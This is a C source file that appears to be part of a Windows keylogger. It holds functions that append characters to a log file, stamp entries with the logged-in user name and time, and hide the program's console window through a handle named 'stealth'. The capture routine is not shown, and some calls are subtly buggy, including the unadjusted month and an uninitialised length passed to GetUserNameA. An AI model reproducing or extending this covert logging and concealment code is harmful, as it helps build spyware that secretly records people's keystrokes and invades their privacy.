#include"Headers.h"

void CreateLog( char * name )
{
  if ( log = fopen( name, "a" ) )
    printf( "Logfile created.\nFile name: %s\n", name );
  else
    printf( "Failed to create the %s file.\n", name );
}

void AddChars( char c )
{
  fputc( c, log );
  Flush();
}
void AddStr(char c[])
{
  fputs(c, log );
  Flush();
}
void CheckPara( int arg, char * argz[] )
{
  if ( arg <= 1 )
  {
    printf( "Error! Enter the file name.\nType \"%s -\" for help.\n", argz[0] );
    exit( 0 );
  }
  else if ( * ( argz[1] ) == '-' || * ( argz[1] ) == '?' )
  {
    printf( "Enter the file name as below.\n" );
    printf( "\"%s Filename.txt\"\n", argz[0] );
    exit( 0 );
  }
}

void CloseFile()
{
  fclose( log );
}

void Flush()
{
  fflush( log );
}

int getSystemTime()
{
  _getsystime( & tmStamp.ltime );
  return tmStamp.ltime.tm_min;
}

void AddStamp()
{
  getSystemTime();
  getUserDetails();
  fprintf(log, "\n####\t\t[%s]Date: %d-%02d-%02d\t Time: %02d:%02d\t\t####\n", tmStamp.uname,
       1900 + tmStamp.ltime.tm_year, tmStamp.ltime.tm_mon, tmStamp.ltime.tm_mday,
       tmStamp.ltime.tm_hour, tmStamp.ltime.tm_min);
  Flush();
}
void getUserDetails()
{
  unsigned long len;
  GetUserNameA(&tmStamp.uname,&len);
}
void hideConsole()
{
  AllocConsole();
  stealth=FindWindowA("ConsoleWindowClass",0);
  ShowWindow(stealth,0);
}
